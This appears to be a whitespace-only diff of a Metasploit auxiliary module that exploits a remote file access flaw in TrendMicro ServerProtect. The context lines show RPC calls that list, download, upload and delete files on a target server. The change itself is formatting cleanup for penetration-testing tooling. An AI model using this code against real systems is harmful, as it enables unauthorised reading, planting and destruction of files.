@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -19,7 +19,7 @@ class Metasploit3 < Msf::Auxiliary
 	include Rex::Platforms::Windows
 
 	def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'           => 'TrendMicro ServerProtect File Access',
 			'Description'    => %q{
 				This modules exploits a remote file access flaw in the ServerProtect Windows
@@ -47,25 +47,23 @@ class Metasploit3 < Msf::Auxiliary
 					[ 'list'     ]
 				]
 			))
-			
-			register_options(
-				[
-					Opt::RPORT(5168),
-					OptString.new('RPATH', 
-						[ 
-							false,
-							"The remote filesystem path", 
-							nil
-						]
-					),
-					OptString.new('LPATH', 
-						[ 
-							false,
-							"The local filesystem path", 
-							nil
-						]
-					),						
-				], self.class)
+
+		register_options(
+			[
+				Opt::RPORT(5168),
+				OptString.new('RPATH',
+					[
+						false,
+						"The remote filesystem path",
+						nil
+					]),
+				OptString.new('LPATH',
+					[
+						false,
+						"The local filesystem path",
+						nil
+					]),
+			], self.class)
 	end
 
 	def check_option(name)
@@ -73,9 +71,9 @@ class Metasploit3 < Msf::Auxiliary
 			raise RuntimeError, "The #{name} parameter is required by this option"
 		end
 	end
-	
+
 	def auxiliary_commands
-		{ 
+		{
 			"delete" => "Delete a file",
 			"download" => "Download a file",
 			"upload" => "Upload a file",
@@ -92,15 +90,15 @@ class Metasploit3 < Msf::Auxiliary
 		when 'upload'
 			check_option('RPATH')
 			check_option('LPATH')
-			cmd_upload(datastore['RPATH'], datastore['LPATH'])		
+			cmd_upload(datastore['RPATH'], datastore['LPATH'])
 		when 'delete'
 			check_option('RPATH')
-			cmd_delete(datastore['RPATH'])		
+			cmd_delete(datastore['RPATH'])
 		when 'list'
 			check_option('RPATH')
 			cmd_list(datastore['RPATH'])
 		else
-			print_error("Unknown action #{action.name}")	
+			print_error("Unknown action #{action.name}")
 		end
 	end
 
@@ -110,9 +108,9 @@ class Metasploit3 < Msf::Auxiliary
 
 	#
 	# Once this function is used, if cmd_download or cmd_upload is called the server will crash :/
-	# 
+	#
 	def cmd_list(*args)
-	
+
 		if (args.length < 1)
 			print_status("Usage: list folder")
 			return
@@ -126,7 +124,7 @@ class Metasploit3 < Msf::Auxiliary
 		# FindFirstFile
 		resp = serverprotect_rpccmd(131080, data, 0x100)
 		return if not resp
-		
+
 		if resp.length != 0x108
 			print_status("An unknown error occured while calling FindFirstFile.")
 			return
@@ -143,7 +141,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		file = deunicode(resp[0x30, 0xd0])
 		print("#{file}\n")
-		
+
 		data = "\0" * 0x100
 		data[0,4] = [handle].pack('V')
 
@@ -151,7 +149,7 @@ class Metasploit3 < Msf::Auxiliary
 			# FindNextFile
 			resp = serverprotect_rpccmd(131081, data, 0x100)
 			return if not resp
-			
+
 			if resp.length != 0x108
 				print_status("An unknown error occured while calling FindFirstFile.")
 				break
@@ -174,7 +172,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	def cmd_delete(*args)
-	
+
 		if (args.length == 0)
 			print_status("Usage: delete c:\\windows\\system.ini")
 			return
@@ -183,7 +181,7 @@ class Metasploit3 < Msf::Auxiliary
 		data = Rex::Text.to_unicode(args[0]+"\0")
 		resp = serverprotect_rpccmd(131077, data, 4)
 		return if not resp
-		
+
 		if (resp.length == 12)
 			ret, = resp[8,4].unpack('V')
 
@@ -198,12 +196,12 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	def cmd_download(*args)
-	
+
 		if (args.length < 2)
 			print_status("Usage: download remote_file local_file")
 			return
 		end
-		
+
 		# GENERIC_READ: 0x80000000
 		# FILE_SHARE_READ: 1
 		# OPEN_EXISTING: 3
@@ -231,7 +229,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	def cmd_upload(*args)
-	
+
 		if (args.length < 2)
 			print_status("Usage: upload local_file remote_file")
 			return
@@ -271,7 +269,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		resp = serverprotect_rpccmd(131073, data, 540)
 		return if not resp
-		
+
 		if (resp.length < 548)
 			print_status("An unknown error occurred while calling CreateFile.")
 			return 0
@@ -363,7 +361,7 @@ class Metasploit3 < Msf::Auxiliary
 			padding = ""
 		end
 
-		stub = 
+		stub =
 			NDR.long(cmd) +
 			NDR.long(data.length) +
 			data +
@@ -373,14 +371,14 @@ class Metasploit3 < Msf::Auxiliary
 
 		return serverprotect_rpc_call(0, stub)
 	end
-	
+
 	#
 	# Call the serverprotect RPC service
-	# 
+	#
 	def serverprotect_rpc_call(opnum, data = '')
 
 		begin
-		
+
 			connect
 
 			handle = dcerpc_handle(
@@ -400,7 +398,7 @@ class Metasploit3 < Msf::Auxiliary
 			disconnect
 
 			outp
-		
+
 		rescue ::Interrupt
 			raise $!
 		rescue ::Exception => e
@@ -408,5 +406,5 @@ class Metasploit3 < Msf::Auxiliary
 			nil
 		end
 	end
-		
+
 end
